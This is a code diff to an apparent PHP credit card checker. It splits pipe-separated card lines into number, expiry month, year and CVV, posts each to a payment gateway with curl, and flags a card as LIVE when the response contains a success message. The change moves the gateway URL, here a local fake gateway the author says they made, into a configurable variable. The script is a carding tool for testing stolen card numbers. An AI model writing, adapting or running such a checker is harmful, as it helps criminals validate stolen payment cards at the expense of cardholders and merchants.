@@ -54,18 +54,41 @@
 					$cvv = explode("|", $cc)[3];
 					if(!(empty($card) && empty($month) && empty($year) && empty($cvv))){
 						//POST DATA OF PAYMENT
+
+
+
+
+					/*
+						
+								GATEWAY INFORMATION
+								GATEWAY INFORMATION
+								GATEWAY INFORMATION
+
+					*/
+
+					$payment_url = 	"http://localhost/site/fake-gate.php";	
 					$postdata = "cardnumber=$card&mouth=$month&year=$year&cvv=$cvv&buy=Buy";
-					$approved_message = "Paid successfully!";
+					$success_message = "Paid successfully!";
+
+					/*
+
+							END OF GATEWAY INFORMATION
+					*/
+
+
+
+
+
 
 					// Start a curl in some payment gateway 
-					$curl = curl_init("http://localhost/site/fake-gate.php"); //This is a fake Gateway, create by me..
+					$curl = curl_init($payment_url); //This is a fake Gateway, create by me..
 					curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
 					curl_setopt($curl, CURLOPT_POST, 1);
 					curl_setopt($curl, CURLOPT_POSTFIELDS, $postdata);
 					$result = curl_exec($curl);
 
 					//If contains the Success Message in result page, cc is live
-					if(strpos($result, $approved_message)){
+					if(strpos($result, $success_message)){
 						echo "<tr style='color: green'>";
 						echo "<td>LIVE</td>";
 						echo "<td>$card</td>";
